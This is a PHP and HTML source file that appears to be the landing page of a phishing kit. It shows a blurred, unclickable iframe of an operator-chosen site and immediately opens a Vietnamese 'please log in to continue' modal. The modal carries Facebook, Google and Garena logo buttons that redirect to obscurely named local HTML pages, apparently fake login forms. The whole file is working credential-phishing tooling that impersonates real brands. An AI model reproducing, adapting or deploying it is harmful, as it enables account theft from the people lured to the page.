<?php
include('config.php');

if(isset($_SESSION['login'])){
    die('You can not access this page');
}

?>


<!DOCTYPE html>
<html style="background-color: black;">
<head>
    <meta content='width=device-width, initial-scale=1' name='viewport'/>
    <title><?=$query['tieude'];?></title>
    <meta name="description" content="<?=$query['mota'];?>"/>
    <link rel="icon" href="<?=$query['avatarweb'];?>" type="image/x-icon" />
    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }

        .fullpage {
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .iframe-container {
            width: 100%;
            height: 100%;
        }

        .iframe-container iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 9999;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%; 
            height: auto;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.5);
        }

        .modal-content {
            background-color: #fefefe;
            margin: 0 auto;
            padding: 20px;
            max-width: 100%;
        }

        body {
            font-family: 'Roboto', sans-serif;
        }

        .modal-open {
            overflow: hidden;
        }

        .no-interaction {
            pointer-events: none;
        }

        .image-grid img {
            width: 75px;
            height: 75px;
        }

        .image-grid img {
            width: 75px;
            margin-right: 25px;
            height: 75px;
        }

        button {
            padding: 0;
            border: none;
            background: 0;
        }
       
        form {
            display: initial;
        }

 
    </style>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
</head>
<body>
    <div class="fullpage">
        <div class="iframe-container">
            <iframe id="CrossDomainiframeId" src="<?=$query123['urlone'];?>" style="filter: blur(3px);"></iframe>
        </div>
    </div>
    
    <div id="myModal" class="modal">
        <div class="modal-content">
            <center>Vui lòng đăng nhập để tiếp tục:</center>
            <div class="image-grid" style="margin-top:20px">
                <center>
                    <?php
                    if($query['fb'] == 'on'){
                        echo '<button onclick="fb()" type="submit"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png"></button>  ';
                    }
                    if($query['gg'] == 'on'){
                        echo '<button onclick="gg()"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/2008px-Google_%22G%22_Logo.svg.png"></button> ';
                    }
                    if($query['gr'] == 'on'){
                        echo '<button onclick="garan()"><img src="https://play-lh.googleusercontent.com/PQFhrkXH3hhvyKXt_AThT0rvncVB6n9Ec5uMvREXkkHN0H2qh4HkUKEBnKU3BS75Rw"></button>      ';
                    }
                    ?>
                </center>
            </div>
        </div>
    </div>
    
    <script>
        <?php
        if($query['fb'] == 'on'){
            echo ' function fb(){
                window.location.href="/cXmKyY9M53YGFEswrMS2j8j6hQASkCWhEBMWABK8wczPRgSK5pDAjX4SmecWJfbqXn23sKgd1G558Hd0.html";
            }';
        }
        if($query['gg'] == 'on'){
            echo ' function gg(){
                window.location.href="/DYR8rR9Kt0T8W9xSrqMjZnnt4hXyxZ0FAkc03MJQPbTzndtk7pBmJ06QhY46wAPGzBxjWwNSTxHyGp5P.html";
            }';
        }
        if($query['gr'] == 'on'){
            echo 'function garan(){
                window.location.href="/YhmRgcdmXygDTmRraHMHGrc6CJ9EgzYr89ecGrFTzhTqAS60TD0wEKse4eCJQM3XNq4H6nYh1rHZKkwh.html";
            } ';
        }
        ?>

        function openModal() {
            var modal = document.querySelector('.modal');
            modal.style.display = 'block';
            document.body.classList.add('modal-open');
            document.querySelector('.iframe-container').classList.add('no-interaction');
            document.querySelector('body').classList.add('blur-background');
        }

        function closeModal() {
            var modal = document.querySelector('.modal');
            modal.style.display = 'none';
            document.body.classList.remove('modal-open');
            document.querySelector('.iframe-container').classList.remove('no-interaction');
            document.querySelector('body').classList.remove('blur-background');
        }

        setTimeout(function() {
            openModal();
        }, 1);
    </script>
</body>
</html>
